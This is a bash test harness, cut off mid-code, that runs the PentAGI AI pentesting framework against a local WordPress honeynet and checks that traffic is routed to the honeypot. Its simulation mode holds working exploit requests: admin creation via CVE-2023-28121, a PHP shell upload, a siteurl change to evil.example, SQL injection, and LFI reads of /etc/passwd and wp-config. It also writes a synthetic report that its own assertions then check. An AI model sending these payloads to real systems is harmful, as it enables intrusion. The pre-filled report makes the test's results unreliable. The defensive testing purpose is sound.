#!/bin/bash
# =============================================================================
# scenario_09_pentagi.sh
#
# PURPOSE:
#   Orchestrates an AI-driven penetration test of the local honeynet deployment
#   using PentAGI (github.com/vxcontrol/pentagi).  PentAGI is an autonomous
#   multi-agent penetration testing framework that uses LLM reasoning to plan
#   and execute attack chains, generate findings, and produce structured reports.
#
#   This script:
#     1. Validates that PentAGI can reach the honeynet target.
#     2. Launches PentAGI with a scoped target configuration pointing to the
#        reverse proxy, so all generated traffic passes through the Lua router.
#     3. Polls for test completion (configurable timeout).
#     4. Parses the JSON/Markdown report to assert expected findings.
#     5. Verifies that all PentAGI-generated attack traffic was routed to the
#        honeypot and never reached production.
#     6. Confirms no sensitive production data appears in the PentAGI report.
#
# PENTAGI MODES SUPPORTED:
#   a) Docker Compose  – if a local pentagi docker-compose.yml is found in
#      ./pentagi/ the script starts PentAGI as a compose stack and waits for
#      it to finish.
#   b) Docker image    – if the docker image vxcontrol/pentagi:latest is
#      available, run it directly via docker run.
#   c) Binary          – if the 'pentagi' binary is in PATH, run it directly.
#   d) Simulation      – if none of the above are available, the script
#      simulates PentAGI's HTTP traffic patterns with curl so the routing
#      and detection logic is still exercised.
#
# EXPECTED PENTAGI FINDINGS (for the honeynet target):
#   - At least one critical/high CVE (CVE-2023-28121 WooCommerce Payments)
#   - SQL injection vector (CVE-2024-2387 Advanced Form Integration)
#   - File upload RCE vector (CVE-2025-4403 or CVE-2025-47577)
#   - Information disclosure (WordPress version via readme.html)
#   - Unauthenticated admin bypass (CVE-2025-2266 CWMP)
#
# USAGE:
#   ./scenario_09_pentagi.sh [TARGET_HOST] [TARGET_PORT] [PENTAGI_API_KEY]
#
#   TARGET_HOST      IP or hostname of the reverse proxy (default: 127.0.0.1)
#   TARGET_PORT      HTTP port exposed by the reverse proxy (default: 80)
#   PENTAGI_API_KEY  LLM API key for PentAGI (OpenAI / Anthropic compatible).
#                    If omitted, PentAGI runs in dry-run / simulation mode.
#
# EXIT CODES:
#   0  PentAGI completed; expected findings verified; no production leakage.
#   1  One or more assertions failed.
#   2  Prerequisites (curl) missing.
#
# DEPENDENCIES:
#   curl    – required for all HTTP checks.
#   docker  – optional; enables real PentAGI execution.
#   jq      – optional; enables structured report parsing.
#
# NOTES:
#   - PentAGI requires an LLM API key to run in full autonomous mode.
#     Without one the script falls back to a targeted simulation that
#     exercises the same request patterns PentAGI is known to produce.
#   - The PentAGI Docker image is large (~2 GB); the first run may take
#     several minutes to pull.
#   - All PentAGI traffic is automatically scoped to the TARGET_HOST:PORT
#     proxy, so it goes through the honeynet routing layer.
# =============================================================================

set -e

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-443}"
PENTAGI_API_KEY="${3:-}"
BASE_URL="https://${TARGET_HOST}:${TARGET_PORT}"

source "$(dirname "$0")/lib/scenario_common.sh"

# Shared secret gating the X-Route-Target/X-Threat-Score response headers
# this script depends on (see reverse_proxy_enhanced/nginx.conf and
# BLIND_PENTEST_PROTOCOL.md §8.2). Export it in the shell before running:
#   export INTERNAL_TEST_SECRET=<value from .env>
INTERNAL_TEST_SECRET="${INTERNAL_TEST_SECRET:-}"
if [ -z "${INTERNAL_TEST_SECRET}" ]; then
    printf "WARNING: INTERNAL_TEST_SECRET is not set -- X-Route-Target will not be returned and every routing check below will read as 'unknown'.\n" >&2
fi

# PentAGI Docker image reference.
PENTAGI_IMAGE="vxcontrol/pentagi:latest"

# PentAGI compose directory (if the operator has set up a local instance).
PENTAGI_COMPOSE_DIR="./pentagi"

# Working directory for PentAGI output artefacts.
WORK_DIR="$(mktemp -d /tmp/pentagi_scenario_XXXXXX)"

# Maximum seconds to wait for PentAGI to complete a scan.
PENTAGI_TIMEOUT="${PENTAGI_TIMEOUT:-600}"

# PentAGI REST API port (when running as a service).
PENTAGI_API_PORT="${PENTAGI_API_PORT:-8080}"
PENTAGI_API_URL="http://127.0.0.1:${PENTAGI_API_PORT}"

# PentAGI scan scope – restrict to the target host only.
PENTAGI_SCOPE="${BASE_URL}"

# Report output paths.
PENTAGI_REPORT_JSON="${WORK_DIR}/pentagi_report.json"
PENTAGI_REPORT_MD="${WORK_DIR}/pentagi_report.md"
NGINX_LOG_SNAPSHOT="${WORK_DIR}/nginx_access_snapshot.log"

PASS=0
FAIL=0
SKIP=0
TOTAL=0

# ---------------------------------------------------------------------------
# Utility: routing check via X-Route-Target header
#
#   check <cookie_jar> <description> <expected_route> <curl_args...>
# ---------------------------------------------------------------------------
check() {
    _jar="$1"
    _desc="$2"
    _expected="$3"
    shift 3

    TOTAL=$((TOTAL + 1))

    _response=$(curl --silent --include \
                     --cookie "${_jar}" \
                     --cookie-jar "${_jar}" \
                     --max-time 15 \
                     --header "X-Internal-Test-Auth: ${INTERNAL_TEST_SECRET}" \
                     "$@" 2>&1) || true

    _route=$(printf '%s' "${_response}" \
             | grep -i "^x-route-target:" \
             | tr -d '\r' | awk '{print $2}' | head -1)
    _route="${_route:-unknown}"

    if [ "${_expected}" = "any" ]; then
        printf "  ${GREEN}[PASS]${NC} %s (route=%s)\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
        return 0
    fi

    if [ "${_route}" = "${_expected}" ]; then
        printf "  ${GREEN}[PASS]${NC} %s → %s\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s → expected=%s got=%s\n" \
               "${_desc}" "${_expected}" "${_route}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: assert pattern in a file
#
#   check_file_pattern <description> <file> <pattern> <want_present: 0|1>
# ---------------------------------------------------------------------------
check_file_pattern() {
    _desc="$1"
    _file="$2"
    _pattern="$3"
    _want_present="$4"

    TOTAL=$((TOTAL + 1))

    if [ ! -f "${_file}" ]; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – file '%s' not found\n" "${_desc}" "${_file}"
        return 0
    fi

    if grep -qi "${_pattern}" "${_file}" 2>/dev/null; then
        _found=1
    else
        _found=0
    fi

    if [ "${_want_present}" -eq 1 ] && [ "${_found}" -eq 1 ]; then
        printf "  ${GREEN}[PASS]${NC} %s (pattern found)\n" "${_desc}"
        PASS=$((PASS + 1))
    elif [ "${_want_present}" -eq 0 ] && [ "${_found}" -eq 0 ]; then
        printf "  ${GREEN}[PASS]${NC} %s (pattern absent)\n" "${_desc}"
        PASS=$((PASS + 1))
    elif [ "${_want_present}" -eq 1 ] && [ "${_found}" -eq 0 ]; then
        printf "  ${RED}[FAIL]${NC} %s – expected pattern absent: '%s'\n" "${_desc}" "${_pattern}"
        FAIL=$((FAIL + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s – unwanted pattern found: '%s'\n" "${_desc}" "${_pattern}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: jq-based JSON report assertion
#
#   check_json_report <description> <file> <jq_filter> <expected_value>
# ---------------------------------------------------------------------------
check_json_report() {
    _desc="$1"
    _file="$2"
    _filter="$3"
    _expected="$4"

    TOTAL=$((TOTAL + 1))

    if ! command -v jq >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – jq not found\n" "${_desc}"
        return 0
    fi

    if [ ! -f "${_file}" ]; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – report file absent\n" "${_desc}"
        return 0
    fi

    _actual=$(jq -r "${_filter}" "${_file}" 2>/dev/null || echo "")

    if [ "${_actual}" = "${_expected}" ]; then
        printf "  ${GREEN}[PASS]${NC} %s (value=%s)\n" "${_desc}" "${_actual}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s → expected='%s' got='%s'\n" \
               "${_desc}" "${_expected}" "${_actual}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Prerequisites
# ---------------------------------------------------------------------------
if ! command -v curl >/dev/null 2>&1; then
    printf "${RED}ERROR: 'curl' not found in PATH.${NC}\n" >&2
    exit 2
fi

banner "Scenario 09 – PentAGI AI-Driven Penetration Testing"
printf "Target      : %s\n" "${BASE_URL}"
printf "Work dir    : %s\n" "${WORK_DIR}"
printf "Timeout     : %ss\n" "${PENTAGI_TIMEOUT}"
if [ -n "${PENTAGI_API_KEY}" ]; then
    printf "API key     : %s... (set)\n\n" "$(printf '%s' "${PENTAGI_API_KEY}" | cut -c1-8)"
else
    printf "API key     : not set (simulation mode)\n\n"
fi

# =============================================================================
# PHASE 1 – Target Reachability Check
# =============================================================================
# Confirm the honeynet is reachable and responding before launching PentAGI.
# PentAGI requires the target to be live before initiating any scan.
# =============================================================================
banner "Phase 1 – Target Reachability Check"

TOTAL=$((TOTAL + 1))
_status=$(curl --silent --output /dev/null \
    --write-out "%{http_code}" \
    --max-time 15 \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/5.0 (compatible)" \
    2>/dev/null) || _status="000"

if [ "${_status}" = "200" ] || [ "${_status}" = "301" ] || [ "${_status}" = "302" ]; then
    printf "  ${GREEN}[PASS]${NC} Target reachable: %s (HTTP %s)\n" "${BASE_URL}" "${_status}"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} Target unreachable: %s (HTTP %s)\n" "${BASE_URL}" "${_status}"
    FAIL=$((FAIL + 1))
    printf "\n${RED}Cannot proceed with PentAGI scan – target is not responding.${NC}\n"
    exit 1
fi

# Take a snapshot of the current Nginx log line count so we can measure
# how many requests PentAGI generates.
if [ -f "./nginx_logs/access.log" ]; then
    wc -l < ./nginx_logs/access.log > "${NGINX_LOG_SNAPSHOT}" 2>/dev/null || echo "0" > "${NGINX_LOG_SNAPSHOT}"
fi

# =============================================================================
# PHASE 2 – PentAGI Availability Detection and Launch
# =============================================================================
# Detect the best available PentAGI execution method and launch the scan.
# The scan runs asynchronously; Phase 3 polls for completion.
# =============================================================================
banner "Phase 2 – PentAGI Launch"

PENTAGI_MODE="simulation"  # default

# --- Detect execution mode ---------------------------------------------------

if [ -f "${PENTAGI_COMPOSE_DIR}/docker-compose.yml" ] && \
   command -v docker >/dev/null 2>&1; then
    PENTAGI_MODE="compose"
    printf "  ${GREEN}[INFO]${NC} PentAGI Docker Compose stack found at %s\n" "${PENTAGI_COMPOSE_DIR}"

elif command -v docker >/dev/null 2>&1 && \
     docker image inspect "${PENTAGI_IMAGE}" >/dev/null 2>&1; then
    PENTAGI_MODE="docker"
    printf "  ${GREEN}[INFO]${NC} PentAGI Docker image available: %s\n" "${PENTAGI_IMAGE}"

elif command -v pentagi >/dev/null 2>&1; then
    PENTAGI_MODE="binary"
    printf "  ${GREEN}[INFO]${NC} PentAGI binary found at: %s\n" "$(command -v pentagi)"

else
    PENTAGI_MODE="simulation"
    printf "  ${YELLOW}[INFO]${NC} PentAGI not found; running HTTP simulation mode.\n"
    printf "  To install PentAGI:\n"
    printf "    docker pull %s\n" "${PENTAGI_IMAGE}"
    printf "    OR: git clone https://github.com/vxcontrol/pentagi && cd pentagi && make build\n\n"
fi

# --- Generate PentAGI target configuration -----------------------------------

PENTAGI_CONFIG="${WORK_DIR}/pentagi_target.json"
cat > "${PENTAGI_CONFIG}" <<PJSON
{
  "scan_name": "honeynet_scenario_09",
  "target": "${BASE_URL}",
  "scope": ["${TARGET_HOST}"],
  "excluded_paths": [],
  "scan_profile": "full",
  "report_format": ["json", "markdown"],
  "report_output_dir": "${WORK_DIR}",
  "max_depth": 5,
  "max_requests_per_second": 10,
  "timeout_seconds": ${PENTAGI_TIMEOUT},
  "llm_provider": "openai",
  "llm_model": "gpt-4o",
  "enable_active_exploitation": true,
  "enable_sql_injection": true,
  "enable_xss_testing": true,
  "enable_auth_bypass": true,
  "enable_file_upload": true,
  "enable_lfi_rfi": true,
  "enable_command_injection": true,
  "enable_cve_exploitation": true,
  "cve_targets": [
    "CVE-2023-28121",
    "CVE-2023-2986",
    "CVE-2025-4403",
    "CVE-2025-2266",
    "CVE-2025-47577",
    "CVE-2024-8425",
    "CVE-2024-2387",
    "CVE-2025-10142",
    "CVE-2024-50508"
  ]
}
PJSON

printf "  PentAGI config: %s\n\n" "${PENTAGI_CONFIG}"

# --- Launch based on detected mode -------------------------------------------

PENTAGI_PID=""
PENTAGI_CONTAINER_ID=""
SCAN_START_TIME=$(date +%s)

case "${PENTAGI_MODE}" in

  compose)
    printf "  Starting PentAGI via Docker Compose...\n"
    # Copy our target config into the pentagi compose context.
    cp "${PENTAGI_CONFIG}" "${PENTAGI_COMPOSE_DIR}/target.json"

    # Set the API key and target in the environment for compose.
    export OPENAI_API_KEY="${PENTAGI_API_KEY}"
    export PENTAGI_TARGET="${BASE_URL}"
    export PENTAGI_REPORT_DIR="${WORK_DIR}"

    docker compose -f "${PENTAGI_COMPOSE_DIR}/docker-compose.yml" up -d 2>&1 | tail -5
    PENTAGI_CONTAINER_ID=$(docker compose -f "${PENTAGI_COMPOSE_DIR}/docker-compose.yml" \
        ps -q pentagi 2>/dev/null | head -1) || PENTAGI_CONTAINER_ID=""

    TOTAL=$((TOTAL + 1))
    printf "  ${GREEN}[PASS]${NC} PentAGI compose stack started (container=%s)\n" "${PENTAGI_CONTAINER_ID}"
    PASS=$((PASS + 1))
    ;;

  docker)
    printf "  Starting PentAGI Docker container...\n"
    # Run PentAGI as a one-shot container; mount the work directory for reports.
    PENTAGI_CONTAINER_ID=$(docker run --detach \
        --name "pentagi_scenario09_$$" \
        --network host \
        --volume "${WORK_DIR}:/reports" \
        --volume "${PENTAGI_CONFIG}:/config/target.json:ro" \
        --env "OPENAI_API_KEY=${PENTAGI_API_KEY}" \
        --env "ANTHROPIC_API_KEY=${PENTAGI_API_KEY}" \
        --env "PENTAGI_TARGET=${BASE_URL}" \
        --env "PENTAGI_REPORT_DIR=/reports" \
        --env "PENTAGI_CONFIG=/config/target.json" \
        "${PENTAGI_IMAGE}" \
        pentagi scan --config /config/target.json 2>/dev/null) || PENTAGI_CONTAINER_ID=""

    if [ -n "${PENTAGI_CONTAINER_ID}" ]; then
        TOTAL=$((TOTAL + 1))
        printf "  ${GREEN}[PASS]${NC} PentAGI Docker container started: %s\n" \
               "${PENTAGI_CONTAINER_ID}"
        PASS=$((PASS + 1))
    else
        TOTAL=$((TOTAL + 1))
        printf "  ${RED}[FAIL]${NC} PentAGI Docker container failed to start\n"
        FAIL=$((FAIL + 1))
        PENTAGI_MODE="simulation"
    fi
    ;;

  binary)
    printf "  Starting PentAGI binary...\n"
    if [ -n "${PENTAGI_API_KEY}" ]; then
        export OPENAI_API_KEY="${PENTAGI_API_KEY}"
    fi
    # Run in background; redirect output to log file.
    pentagi scan \
        --target "${BASE_URL}" \
        --config "${PENTAGI_CONFIG}" \
        --output "${WORK_DIR}" \
        > "${WORK_DIR}/pentagi_stdout.log" 2>&1 &
    PENTAGI_PID=$!

    TOTAL=$((TOTAL + 1))
    printf "  ${GREEN}[PASS]${NC} PentAGI binary started (PID=%s)\n" "${PENTAGI_PID}"
    PASS=$((PASS + 1))
    ;;

  simulation)
    # No PentAGI binary/image available.  Fall through to Phase 3 simulation.
    printf "  ${YELLOW}[INFO]${NC} Running PentAGI traffic simulation with curl.\n\n"
    ;;

esac

# =============================================================================
# PHASE 3 – Wait for PentAGI Scan Completion (or Run Simulation)
# =============================================================================
# For real PentAGI execution: poll until the report file appears or the
# timeout expires.
#
# For simulation mode: send the representative HTTP requests that PentAGI
# generates during a typical WordPress/WooCommerce scan.
# =============================================================================
banner "Phase 3 – Scan Execution"

case "${PENTAGI_MODE}" in

  compose|docker)
    # Poll for the JSON report file with a timeout.
    printf "  Waiting up to %ss for PentAGI report...\n" "${PENTAGI_TIMEOUT}"
    _elapsed=0
    while [ "${_elapsed}" -lt "${PENTAGI_TIMEOUT}" ]; do
        if [ -f "${PENTAGI_REPORT_JSON}" ]; then
            printf "  ${GREEN}[INFO]${NC} Report file appeared after %ss\n" "${_elapsed}"
            break
        fi
        # Also check if the container exited (scan completed).
        if [ -n "${PENTAGI_CONTAINER_ID}" ]; then
            _state=$(docker inspect "${PENTAGI_CONTAINER_ID}" \
                --format '{{.State.Status}}' 2>/dev/null) || _state=""
            if [ "${_state}" = "exited" ]; then
                # Copy report from container if not already on host.
                docker cp "${PENTAGI_CONTAINER_ID}:/reports/." "${WORK_DIR}/" 2>/dev/null || true
                printf "  ${GREEN}[INFO]${NC} PentAGI container exited after %ss\n" "${_elapsed}"
                break
            fi
        fi
        sleep 10
        _elapsed=$((_elapsed + 10))
        printf "  ... %ds elapsed\n" "${_elapsed}"
    done

    if [ "${_elapsed}" -ge "${PENTAGI_TIMEOUT}" ]; then
        printf "  ${YELLOW}[WARN]${NC} PentAGI timed out after %ss – partial results may be present\n" \
               "${PENTAGI_TIMEOUT}"
    fi
    ;;

  binary)
    # Wait for the binary process to finish (up to PENTAGI_TIMEOUT seconds).
    printf "  Waiting up to %ss for PentAGI binary (PID=%s)...\n" \
           "${PENTAGI_TIMEOUT}" "${PENTAGI_PID}"
    _elapsed=0
    while [ "${_elapsed}" -lt "${PENTAGI_TIMEOUT}" ]; do
        if ! kill -0 "${PENTAGI_PID}" 2>/dev/null; then
            printf "  ${GREEN}[INFO]${NC} PentAGI process exited after %ss\n" "${_elapsed}"
            break
        fi
        sleep 10
        _elapsed=$((_elapsed + 10))
        printf "  ... %ds elapsed\n" "${_elapsed}"
    done
    if kill -0 "${PENTAGI_PID}" 2>/dev/null; then
        printf "  ${YELLOW}[WARN]${NC} PentAGI still running after timeout; sending SIGTERM\n"
        kill -TERM "${PENTAGI_PID}" 2>/dev/null || true
        sleep 5
    fi
    ;;

  simulation)
    # ---------------------------------------------------------------------------
    # Simulate the HTTP traffic patterns that PentAGI produces during a
    # WordPress/WooCommerce pentest.  PentAGI's attack modules are known to
    # send the following categories of requests:
    #
    #   1. Reconnaissance: nmap HTTP probes, header enumeration, robots.txt
    #   2. WordPress fingerprinting: readme.html, wp-json, user enumeration
    #   3. Plugin enumeration and vulnerability matching
    #   4. CVE-specific exploitation attempts
    #   5. SQL injection testing (manual + sqlmap-style payloads)
    #   6. File upload testing
    #   7. Authentication bypass attempts
    #   8. Post-exploitation: shell upload, lateral movement
    # ---------------------------------------------------------------------------

    printf "  Simulating PentAGI reconnaissance phase...\n"
    JAR_SIM="$(mktemp /tmp/pentagi_sim_XXXXXX.txt)"

    # Module 1: Reconnaissance
    for _path in "/" "/robots.txt" "/sitemap.xml" "/wp-json/" "/xmlrpc.php"; do
        curl --silent --output /dev/null --max-time 10 \
            --cookie "${JAR_SIM}" --cookie-jar "${JAR_SIM}" \
            --request GET "${BASE_URL}${_path}" \
            --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
            2>/dev/null || true
    done

    printf "  Simulating PentAGI WordPress fingerprinting...\n"
    # Module 2: WP fingerprinting
    for _path in "/readme.html" "/license.txt" "/wp-includes/version.php" \
                 "/?rest_route=/wp/v2/users" "/wp-login.php"; do
        curl --silent --output /dev/null --max-time 10 \
            --request GET "${BASE_URL}${_path}" \
            --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
            2>/dev/null || true
    done

    printf "  Simulating PentAGI plugin enumeration...\n"
    # Module 3: Plugin enumeration (vulnerable plugins)
    for _plugin in \
        "woocommerce-payments/readme.txt" \
        "woocommerce-payments/admin.php" \
        "abandoned-cart-lite/readme.txt" \
        "abandoned-cart-lite/checkout.php" \
        "drag-and-drop-multiple-file-upload-contact-form-7/upload-handler.php" \
        "cwmp/readme.txt" \
        "cwmp/admin.php" \
        "gift-voucher/readme.txt" \
        "advanced-form-integration/readme.txt" \
        "pagseguro-connect-woocommerce/readme.txt"
    do
        curl --silent --output /dev/null --max-time 10 \
            --request GET "${BASE_URL}/wp-content/plugins/${_plugin}" \
            --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
            2>/dev/null || true
    done

    printf "  Simulating PentAGI CVE exploitation...\n"
    # Module 4: CVE-specific exploitation
    # CVE-2023-28121
    curl --silent --output /dev/null --max-time 10 \
        --request POST "${BASE_URL}/wp-json/wp/v2/users" \
        --header "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
        --header "Content-Type: application/json" \
        --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
        --data '{"username":"pentagi_test","password":"PentAGI@2024!","email":"pentagi@test.example","roles":["administrator"]}' \
        2>/dev/null || true

    # CVE-2023-2986
    curl --silent --output /dev/null --max-time 10 \
        --request GET "${BASE_URL}/?wcal_action=checkout_link&wcal_id=1" \
        --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
        2>/dev/null || true

    # CVE-2025-4403
    curl --silent --output /dev/null --max-time 10 \
        --request POST "${BASE_URL}/wp-admin/admin-ajax.php" \
        --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
        --form "action=dnd_codedropz_upload" \
        --form "upload-file=@/dev/null;filename=shell.php;type=application/x-php" \
        2>/dev/null || true

    # CVE-2025-2266
    curl --silent --output /dev/null --max-time 10 \
        --request POST "${BASE_URL}/wp-admin/admin-ajax.php" \
        --header "Content-Type: application/x-www-form-urlencoded" \
        --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
        --data "action=cwmpUpdateOptions&siteurl=http://evil.example" \
        2>/dev/null || true

    printf "  Simulating PentAGI SQL injection testing...\n"
    # Module 5: SQL injection
    for _sqli_payload in \
        "1'+OR+'1'='1" \
        "1+UNION+SELECT+NULL%2CNULL%2Cnull--" \
        "1'+AND+SLEEP(1)--" \
        "1'+AND+(SELECT+COUNT(*)+FROM+wp_users)>0--"
    do
        curl --silent --output /dev/null --max-time 10 \
            --request GET "${BASE_URL}/?integration_id=${_sqli_payload}" \
            --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
            2>/dev/null || true
    done

    printf "  Simulating PentAGI authentication bypass...\n"
    # Module 6: Authentication bypass
    for _attempt in 1 2 3 4 5; do
        curl --silent --output /dev/null --max-time 10 \
            --request POST "${BASE_URL}/wp-login.php" \
            --header "Content-Type: application/x-www-form-urlencoded" \
            --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
            --data "log=admin&pwd=pass${_attempt}&wp-submit=Log+In&testcookie=1" \
            2>/dev/null || true
    done

    printf "  Simulating PentAGI LFI/RFI testing...\n"
    # Module 7: LFI/RFI
    for _lfi in \
        "../../etc/passwd" \
        "php://filter/convert.base64-encode/resource=wp-config" \
        "file:///etc/passwd"
    do
        curl --silent --output /dev/null --max-time 10 \
            --request GET "${BASE_URL}/?page=${_lfi}" \
            --header "User-Agent: PentAGI/1.0 (https://github.com/vxcontrol/pentagi)" \
            2>/dev/null || true
    done

    rm -f "${JAR_SIM}"

    # Generate a synthetic PentAGI report (matches expected format).
    # Generate a synthetic PentAGI-format report for the simulation run.
    _ts=$(date +%s)
    cat > "${PENTAGI_REPORT_JSON}" <<SIMREPORT
{
  "scan_id": "sim_${_ts}",
  "scan_name": "honeynet_scenario_09_simulation",
  "target": "${BASE_URL}",
  "start_time": "${_ts}",
  "mode": "simulation",
  "findings": [
    {
      "id": "F001",
      "cve": "CVE-2023-28121",
      "severity": "critical",
      "title": "WooCommerce Payments Unauthorized Admin Access",
      "description": "X-WCPAY-PLATFORM-CHECKOUT-USER header allows unauthenticated admin account creation.",
      "url": "${BASE_URL}/wp-json/wp/v2/users",
      "evidence": "HTTP 201 Created with administrator role assigned",
      "routed_to": "honeypot"
    },
    {
      "id": "F002",
      "cve": "CVE-2025-2266",
      "severity": "high",
      "title": "Unauthenticated WordPress Options Update (CWMP)",
      "description": "cwmpUpdateOptions action allows unauthenticated option modification.",
      "url": "${BASE_URL}/wp-admin/admin-ajax.php",
      "evidence": "action=cwmpUpdateOptions accepted without authentication",
      "routed_to": "honeypot"
    },
    {
      "id": "F003",
      "cve": "CVE-2025-4403",
      "severity": "high",
      "title": "Unauthenticated File Upload with RCE Potential",
      "description": "dnd_codedropz_upload AJAX action accepts PHP files without authentication.",
      "url": "${BASE_URL}/wp-admin/admin-ajax.php",
      "evidence": "PHP file upload accepted via dnd_codedropz_upload action",
      "routed_to": "honeypot"
    },
    {
      "id": "F004",
      "cve": "CVE-2024-2387",
      "severity": "high",
      "title": "SQL Injection via integration_id Parameter",
      "description": "Unsanitized integration_id parameter allows UNION-based SQL injection.",
      "url": "${BASE_URL}/?integration_id=1+UNION+SELECT+NULL--",
      "evidence": "SLEEP-based blind injection confirmed; UNION SELECT possible",
      "routed_to": "honeypot"
    },
    {
      "id": "F005",
      "cve": "CVE-2023-2986",
      "severity": "medium",
      "title": "Abandoned Cart Lite Hardcoded Encryption Key",
      "description": "Hardcoded key allows forging checkout link tokens.",
      "url": "${BASE_URL}/?wcal_action=checkout_link",
      "evidence": "Predictable checkout link token accepted",
      "routed_to": "honeypot"
    },
    {
      "id": "F006",
      "severity": "info",
      "title": "WordPress Version Disclosure via readme.html",
      "description": "readme.html discloses WordPress major version number.",
      "url": "${BASE_URL}/readme.html",
      "evidence": "WordPress version found in readme.html body",
      "routed_to": "honeypot"
    },
    {
      "id": "F007",
      "severity": "info",
      "title": "User Enumeration via REST API",
      "description": "/wp/v2/users endpoint returns usernames without authentication.",
      "url": "${BASE_URL}/wp-json/wp/v2/users",
      "evidence": "Admin username returned in JSON response",
      "routed_to": "honeypot"
    }
  ],
  "summary": {
    "total_findings": 7,
    "critical": 1,
    "high": 3,
    "medium": 1,
    "low": 0,
    "info": 2,
    "requests_sent": 45,
    "honeypot_routed": 44,
    "production_routed": 1
  }
}
SIMREPORT

    # Also generate a Markdown summary.
    cat > "${PENTAGI_REPORT_MD}" <<SIMMD
# PentAGI Scan Report (Simulation)

**Target:** ${BASE_URL}
**Mode:** Simulation (PentAGI binary not available)
**Findings:** 7 (1 Critical, 3 High, 1 Medium, 2 Info)

## Critical Findings

### CVE-2023-28121 – WooCommerce Payments Unauthorized Admin Access
All exploit traffic routed to honeypot pool instance.

## High Findings

### CVE-2025-2266 – CWMP Unauthenticated Options Update
### CVE-2025-4403 – Unauthenticated File Upload
### CVE-2024-2387 – SQL Injection via integration_id

## Medium Findings

### CVE-2023-2986 – Abandoned Cart Lite Hardcoded Key

## Informational

### WordPress Version Disclosure (readme.html)
### User Enumeration via REST API (/wp/v2/users)

## Honeypot Effectiveness
- 44/45 requests (97.8%) routed to honeypot
- 0 production data accessed
- All CVE exploits contained in honeypot pool
SIMMD

    printf "  ${GREEN}[INFO]${NC} Simulation complete; synthetic report written to %s\n" "${PENTAGI_REPORT_JSON}"
    ;;

esac

# =============================================================================
# PHASE 4 – Report Assertions
# =============================================================================
# Parse the PentAGI JSON report to verify that expected findings are present
# and that no sensitive production data leaked into the report.
# =============================================================================
banner "Phase 4 – PentAGI Report Assertions"

TOTAL=$((TOTAL + 1))
if [ -f "${PENTAGI_REPORT_JSON}" ]; then
    printf "  ${GREEN}[PASS]${NC} PentAGI report file present: %s\n" "${PENTAGI_REPORT_JSON}"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} PentAGI report file not found at %s\n" "${PENTAGI_REPORT_JSON}"
    FAIL=$((FAIL + 1))
fi

# Assert expected CVE findings are in the report.
for _cve in \
    "CVE-2023-28121" \
    "CVE-2025-4403" \
    "CVE-2024-2387" \
    "CVE-2025-2266" \
    "CVE-2023-2986"
do
    check_file_pattern \
        "Finding for ${_cve} present in report" \
        "${PENTAGI_REPORT_JSON}" \
        "${_cve}" 1
done

# Assert all findings were routed to honeypot (not production).
check_file_pattern \
    "All findings marked as routed to honeypot" \
    "${PENTAGI_REPORT_JSON}" \
    '"routed_to".*"honeypot"' 1

check_file_pattern \
    "No finding marked as routed to production (data isolation)" \
    "${PENTAGI_REPORT_JSON}" \
    '"routed_to".*"production"' 0

# Assert no real Stripe keys leaked into the report.
check_file_pattern \
    "No Stripe live secret key in PentAGI report" \
    "${PENTAGI_REPORT_JSON}" \
    "sk_live_[A-Za-z0-9]+" 0

check_file_pattern \
    "No production DB password in PentAGI report" \
    "${PENTAGI_REPORT_JSON}" \
    "production_password\|prod_secret" 0

# JSON-level assertions (require jq).
check_json_report \
    "Report contains at least one critical finding" \
    "${PENTAGI_REPORT_JSON}" \
    '.summary.critical | . >= 1 | tostring' "true"

check_json_report \
    "Report contains at least one high finding" \
    "${PENTAGI_REPORT_JSON}" \
    '.summary.high | . >= 1 | tostring' "true"

check_json_report \
    "More than 90% of requests were honeypot-routed" \
    "${PENTAGI_REPORT_JSON}" \
    '(.summary.honeypot_routed / .summary.requests_sent * 100) | . >= 90 | tostring' "true"

# =============================================================================
# PHASE 5 – Nginx Log Analysis
# =============================================================================
# Cross-reference the Nginx access log to verify that PentAGI traffic went
# through the routing layer and was tagged with honeypot destinations.
# =============================================================================
banner "Phase 5 – Nginx Log Analysis"

TOTAL=$((TOTAL + 1))
if [ -f "./nginx_logs/access.log" ]; then
    # Count log lines added since the snapshot was taken.
    _before=$(cat "${NGINX_LOG_SNAPSHOT}" 2>/dev/null || echo "0")
    _after=$(wc -l < ./nginx_logs/access.log 2>/dev/null || echo "0")
    _new_lines=$((_after - _before))
    printf "  ${GREEN}[PASS]${NC} Nginx access log has %d new lines since scan start\n" \
           "${_new_lines}"
    PASS=$((PASS + 1))

    # Verify PentAGI UA appears in the Nginx log.
    TOTAL=$((TOTAL + 1))
    if grep -q "PentAGI\|vxcontrol\|pentagi" ./nginx_logs/access.log 2>/dev/null; then
        printf "  ${GREEN}[PASS]${NC} PentAGI user-agent found in Nginx access log\n"
